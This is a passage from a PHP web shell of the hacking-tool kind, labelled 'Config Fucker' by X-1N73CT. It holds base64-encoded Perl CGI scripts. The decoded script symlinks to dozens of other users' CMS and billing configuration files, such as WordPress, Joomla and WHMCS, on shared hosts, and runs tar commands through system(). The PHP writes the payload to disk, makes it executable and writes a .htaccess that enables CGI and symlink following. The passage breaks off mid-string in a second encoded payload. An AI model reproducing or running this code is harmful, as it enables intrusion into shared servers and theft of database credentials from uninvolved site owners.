BzeW1saW5rKCcvaG9tZTYvJy4kdXNlci4nL3B1YmxpY19odG1sL2RhdGFzL2NvbmZpZy5waHAnLCRkb21haW4uJ34+U2VkaXRpby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL1NTSS5waHAnLCRkb21haW4uJ35+PkNNRi5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vU1NJLnBocCcsJGRvbWFpbi4nfn4+Q01GLWZvcnVtLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5pbmknKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi1mb3J1bS5pbmknKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcucGhwJywkZG9tYWluLid+fj5PdGhlci5pbmknKSA7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9saWIvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+QmFsaXRiYW5nLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50cy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xpZW50LmluaScpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5nL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5iaWxsaW5nLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9iaWxsaW5ncy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+YmlsbGluZ3MuaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+UGhwQkItZm9ydW0uaW5pJykgOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaW5jbHVkZXMvZnVuY3Rpb25zLnBocCcsJGRvbWFpbi4nfn4+cGhwYmIzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2htY3MvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWNzLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93aG0vY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dobWMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PndobWMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdWJtaXR0aWNrZXQucGhwJywkZG9tYWluLid+fj53aG1jczIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9tYW5hZ2UvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm1hbmdld2htY3MuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3JkZXIvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PldobTkuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9teXNob3AvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pm15c2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5zdXBwb3J0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3VwcG9ydHMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PnN1cHBvcnRzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5vc2NvbW1lcmNlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvb3Njb21tZXJjZXMvaW5jbHVkZXMvY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+b3Njb21tZXJjZXMuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9zaG9wcGluZy9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLXNob3BwaW5nLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc2FsZS9pbmNsdWRlcy9jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zYWxlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYW1lbWJlci9jb25maWcuaW5jLnBocCcsJGRvbWFpbi4nfn4+YW1lbWJlci5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5pbmMucGhwJywkZG9tYWluLid+fj5hbWVtYmVyMi5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3Avd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXdwLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd3AvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd3AtYmV0YS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2JldGEvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcmVzcy93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53cDEzLXByZXNzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd29yZHByZXNzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13b3JkcHJlc3MuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC93b3JkcHJlc3MvYmV0YS93cC1jb25maWcucGhwJywkZG9tYWluLid+fj53b3JkcHJlc3Mtd29yZHByZXNzLWJldGEuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXdzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbmV3L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1uZXcuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ibG9nL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy5pbmknKSA7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvd2ViL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy13ZWIuaW5pJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Jsb2dzL3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy1ibG9ncy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLWhvbWUuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wcm90YWwvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+b3JkcHJlc3Mtc2l0ZS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL21haW4vd3AtY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+d29yZHByZXNzLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC90ZXN0L3dwLWNvbmZpZy5waHAnLCRkb21haW4uJ35+PndvcmRwcmVzcy10ZXN0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvYmV0YS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLmluaScpIDsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLmluaScpIDsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvb21sYS9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvb21sYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Byb3RhbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLXByb3RhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2pvby9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWpvby5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2Ntcy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLWNtcy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1zaXRlLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvbWFpbi9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW1haW4uaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9uZXdzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5qb29tbGEtbmV3cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL25ldy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+am9vbWxhLW5ldy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvbWUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+Pmpvb21sYS1ob21lLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+VkJ1bGxldGluLWZvcnVtLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvdmIvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC92YjMvaW5jbHVkZXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+dmIzLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY3BhbmVsL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jcGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9wYW5lbC9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+cGFuZWwuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ob3N0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvaG9zdGluZy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+aG9zdGluZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2hvc3RzL2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5ob3N0cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC96ZW5jYXJ0L2luY2x1ZGVzL2Rpc3QtY29uZmlndXJlLnBocCcsJGRvbWFpbi4nfn4+emVuY2FydC1zaG9wLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3Nob3AvaW5jbHVkZXMvZGlzdC1jb25maWd1cmUucGhwJywkZG9tYWluLid+fj5zaG9wLVpDc2hvcC5pbmknKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9ta19jb25mLnBocCcsJHBkb21haW4uJ35+Pm1rLXBvcnRhbGUxLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc21mL1NldHRpbmdzLnBocCcsJGRvbWFpbi4nfn4+c21mLXNtZi5pbmknKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TZXR0aW5ncy5waHAnLCRkb21haW4uJ35+PnNtZi1mb3J1bS5pbmknKTsgDQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bXMvU2V0dGluZ3MucGhwJywkZG9tYWluLid+fj5zbWYtZm9ydW1zLmluaScpOyANCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3VwbG9hZC9pbmNsdWRlcy9jb25maWcucGhwJywkZG9tYWluLid+fj51cGxvYWQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmNsL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pm1hbGF5LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50ZXMvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsZW50cy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2NsaWVudGUvY29uZmlndXJhdGlvbi5waHAnLCRkb21haW4uJ35+PmNsaWVudDIuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jbGllbnRzdXBwb3J0L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnQuaW5pJyk7DQogc3ltbGluaygnL2hvbWU3LycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25maWcva29uZWtzaS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PndlYmNvbmZpZy5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2FkbWluL2NvbmYucGhwJywkZG9tYWluLid+fj53ZWJjb25maWcyLmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYTEuaW5pJyk7IA0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvc3lzdGVtL3Npc3RlbS5waHAnLCRkb21haW4uJ35+Pmxva29tZWRpYS5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL3NpdGVzL2RlZmF1bHQvc2V0dGluZ3MucGhwJywkZG9tYWluLid+PkRydXBhbC5pbmknKTsNCiBzeW1saW5rKCcvaG9tZTcvJy4kdXNlci4nL3B1YmxpY19odG1sL2UxMDdfY29uZmlnLnBocCcsJGRvbWFpbi4nfj5lMTA3LmluaScpOw0KIHN5bWxpbmsoJy9ob21lNy8nLiR1c2VyLicvcHVibGljX2h0bWwvZGF0YXMvY29uZmlnLnBocCcsJGRvbWFpbi4nfj5TZWRpdGlvLmluaScpOw0KfQ0KaWYgKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgJ1BPU1QnKSB7DQogIHJlYWQoU1RESU4sICRidWZmZXIsICRFTlZ7J0NPTlRFTlRfTEVOR1RIJ30pOw0KfSBlbHNlIHsNCiAgJGJ1ZmZlciA9ICRFTlZ7J1FVRVJZX1NUUklORyd9Ow0KfQ0KQHBhaXJzID0gc3BsaXQoLyYvLCAkYnVmZmVyKTsNCmZvcmVhY2ggJHBhaXIgKEBwYWlycykgew0KICAoJG5hbWUsICR2YWx1ZSkgPSBzcGxpdCgvPS8sICRwYWlyKTsNCiAgJG5hbWUgPX4gdHIvKy8gLzsNCiAgJG5hbWUgPX4gcy8lKFthLWZBLUYwLTldW2EtZkEtRjAtOV0pL3BhY2soIkMiLCBoZXgoJDEpKS9lZzsNCiAgJHZhbHVlID1+IHRyLysvIC87DQogICR2YWx1ZSA9fiBzLyUoW2EtZkEtRjAtOV1bYS1mQS1GMC05XSkvcGFjaygiQyIsIGhleCgkMSkpL2VnOw0KICAkRk9STXskbmFtZX0gPSAkdmFsdWU7DQp9DQppZiAoJEZPUk17cGFzc30gZXEgIiIpew0KcHJpbnQgJw0KPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5CeXBhc3NpbmcgU3ltbGluayBVc2luZyAuaW5pIE1ldGhvZCA8L3A+DQo8cD48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250Pg0KPGZvcm0gbWV0aG9kPSJwb3N0Ij4NCjx0ZXh0YXJlYSBuYW1lPSJwYXNzIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgIzAwZmYwMDsgd2lkdGg6IDU0M3B4OyBoZWlnaHQ6IDQyMHB4OyBiYWNrZ3JvdW5kLWNvbG9yOiMwQzBDMEM7IGZvbnQtZmFtaWx5OlRhaG9tYTsgZm9udC1zaXplOjhwdDsgY29sb3I6I0ZGMDAwMCIgID48L3RleHRhcmVhPjwvcD4NCjxwIGFsaWduPSJjZW50ZXIiPg0KPGlucHV0IG5hbWU9InRhciIgdHlwZT0idGV4dCIgc3R5bGU9ImJvcmRlcjoxcHggZG90dGVkICNGRjAwMDA7IHdpZHRoOiAyMTJweDsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDOyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZTo4cHQ7IGNvbG9yOiNGRjAwMDA7ICIgIC8+PC9wPg0KPHAgYWxpZ249ImNlbnRlciI+DQo8aW5wdXQgbmFtZT0iU3VibWl0MSIgdHlwZT0ic3VibWl0IiB2YWx1ZT0iR0VUIENPTkZJRyAhIiBzdHlsZT0iYm9yZGVyOjFweCBkb3R0ZWQgI0ZGMDAwMDsgd2lkdGg6IDk5OyBmb250LWZhbWlseTpUYWhvbWE7IGZvbnQtc2l6ZToxMHB0OyBjb2xvcjojNTlFODE3OyB0ZXh0LXRyYW5zZm9ybTp1cHBlcmNhc2U7IGhlaWdodDoyMzsgYmFja2dyb3VuZC1jb2xvcjojMEMwQzBDIiAvPjwvcD4NCjwvZm9ybT4nOw0KfWVsc2V7DQpAbGluZXMgPTwkRk9STXtwYXNzfT47DQokeSA9IEBsaW5lczsNCm9wZW4gKE1ZRklMRSwgIj50YXIudG1wIik7DQpwcmludCBNWUZJTEUgInRhciAtY3pmICIuJEZPUk17dGFyfS4iLnRhciAiOw0KZm9yICgka2E9MDska2E8JHk7JGthKyspew0Kd2hpbGUoQGxpbmVzWyRrYV0gID1+IG0vKC4qPyk6eDovZyl7DQombGlsKCQxKTsNCnByaW50IE1ZRklMRSAkMS4iLnR4dCAiOw0KZm9yKCRrZD0xOyRrZDwxODska2QrKyl7DQpwcmludCBNWUZJTEUgJDEuJGtkLiIudHh0ICI7DQp9DQp9DQogfQ0KcHJpbnQnPGJvZHkgY2xhc3M9Im5ld1N0eWxlMSIgYmdjb2xvcj0iIzAwMDAwMCI+DQo8cD5Zb3UgZ290IGl0ISE8YnI+PGJyPjxicj48Zm9udCBjb2xvcj0iI0MwQzBDMCI+WzwvZm9udD4gQ29kZWQgQnkgPGZvbnQgY29sb3I9IiNGRjAwMDAiPlgtMU43M0NUPC9mb250Pjxmb250IGNvbG9yPSIjQzBDMEMwIj5dPC9mb250PjwvcD4NCjxwPiZuYnNwOzwvcD4nOw0KaWYoJEZPUk17dGFyfSBuZSAiIil7DQpvcGVuKElORk8sICJ0YXIudG1wIik7DQpAbGluZXMgPTxJTkZPPiA7DQpjbG9zZShJTkZPKTsNCnN5c3RlbShAbGluZXMpOw0KcHJpbnQnPHA+PGEgaHJlZj0iJy4kRk9STXt0YXJ9LicudGFyIj48Zm9udCBjb2xvcj0iIzAwRkYwMCI+DQo8c3BhbiBzdHlsZT0idGV4dC1kZWNvcmF0aW9uOiBub25lIj5DbGljayBIZXJlIFRvIERvd25sb2FkIFRhciBGaWxlPC9zcGFuPjwvZm9udD48L2E+PC9wPic7DQp9DQp9DQogcHJpbnQiDQo8L2JvZHk+DQo8L2h0bWw+Ijs='; 
$file = fopen("cfi.pl" ,"w+");
$write = fwrite ($file ,base64_decode($configshell));
fclose($file);
 chmod("cfi.pl",0755);
	chmod(".htaccess",0755);
   echo "<iframe src=CFI/cfi.pl width=97% height=100% frameborder=0></iframe>

   </div>";
   

}
 
 #==================[ Multi BConfig Fucker ]==================#

if(isset($_POST['lcf']))
{
echo "<center/><b><font color=>+--==[ Litespeed config Fucker ]==--+</font></b><br><br>";
mkdir('LCF',0755);
	chdir('LCF');
		$kokdosya = ".htaccess";
        $dosya_adi = "$kokdosya";
        $dosya = fopen ($dosya_adi , 'w') or die ("Error mas broo!!!");
        $metin = "OPTIONS Indexes Includes ExecCGI FollowSymLinks	\n AddType application/x-httpd-cgi .pl \n AddHandler cgi-script .pl \n AddHandler cgi-script .pl
\n \n Options \n DirectoryIndex seees.html \n RemoveHandler .php \n AddType application/octet-stream .php";    
        fwrite ( $dosya , $metin ) ;
        fclose ($dosya);
		$lcf ='IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQpwcmludCAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWxcblxuIjsNCnByaW50JzwhRE9DVFlQRSBodG1sIFBVQkxJQyAiLS8vVzNDLy9EVEQgWEhUTUwgMS4wIFRyYW5zaXRpb25hbC8vRU4iICJodHRwOi8vd3d3LnczLm9yZy9UUi94aHRtbDEvRFREL3hodG1sMS10cmFuc2l0aW9uYWwuZHRkIj4NCjxodG1sIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hodG1sIj4NCjxoZWFkPg0KPG1ldGEgaHR0cC1lcXVpdj0iQ29udGVudC1MYW5ndWFnZSIgY29udGVudD0iZW4tdXMiIC8+DQo8bWV0YSBodHRwLWVxdWl2PSJDb250ZW50LVR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD11dGYtOCIgLz4NCjx0aXRsZT5Db25maWcgRnVja2VyIEJ5IFgtMW43M2N0PC90aXRsZT4NCjxsaW5rIHJlbD0ic2hvcnRjdXQgaWNvbiIgaHJlZj0iaHR0cDovL3BuZy0zLmZpbmRpY29ucy5jb20vZmlsZXMvaWNvbnMvMTkzNS9yZWRfZ2Vtc192b2xfMi8xMjgvcjJfZHJhZ29uLnBuZyIvPg0KPHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCmJvZHkgew0KCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7DQoNCn0NCi5uZXdTdHlsZTEgew0KIGZvbnQtZmFtaWx5OiBUYWhvbWE7DQogZm9udC1zaXplOiB4LXNtYWxsOw0KIGZvbnQtd2VpZ2h0OiBib2xkOw0KIGNvbG9yOiAjMDBmZjAwOw0KICB0ZXh0LWFsaWduOiBjZW50ZXI7DQp9DQo8L3N0eWxlPg0KPC9oZWFkPg0KJzsNCnN1YiBsaWx7DQogICAgKCR1c2VyKSA9IEBfOw0KJG1zciA9IHF4e3B3ZH07DQokZG9tYWluPSRtc3IuIi8iLiR1c2VyOw0KJGRvbWFpbj1+cy9cbi8vZzsNCnN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9TU0kucGhwJywkZG9tYWluLid+fj5DTUYuc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9mb3J1bS9TU0kucGhwJywkZG9tYWluLid+fj5DTUYtZm9ydW0uc2h0bWwnKSA7IA0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9pbmMvY29uZmlnLnBocCcsJGRvbWFpbi4nfn4+TXlCQi5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvZm9ydW0vaW5jL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk15QkItZm9ydW0uc2h0bWwnKSA7DQogc3ltbGluaygnL2hvbWUvJy4kdXNlci4nL3B1YmxpY19odG1sL2NvbmZpZy5waHAnLCRkb21haW4uJ35+Pk90aGVyLnNodG1sJykgOw0KIHN5bWxpbmsoJy9ob21lLycuJHVzZXIuJy9wdWJsaWNfaHRtbC9jb25mX2dsb2JhbC5waHAnLCRkb21haW4uJ35+PmludmlzaW8uc2h0bWwnKTsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvbGliL2NvbmZpZy5waHAnLCRkb21haW4uJ35+PkJhbGl0YmFuZy5zaHRtbCcpIDsNCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50L2NvbmZpZ3VyYXRpb24ucGhwJywkZG9tYWluLid+fj5jbGllbnRzLnNodG1sJykgOyANCiBzeW1saW5rKCcvaG9tZS8nLiR1c2VyLicvcHVibGljX2h0bWwvY2xpZW50cy9jb25maWd1cmF0aW9uLnBocCcsJGRvbWFpbi4nfn4+Y2xp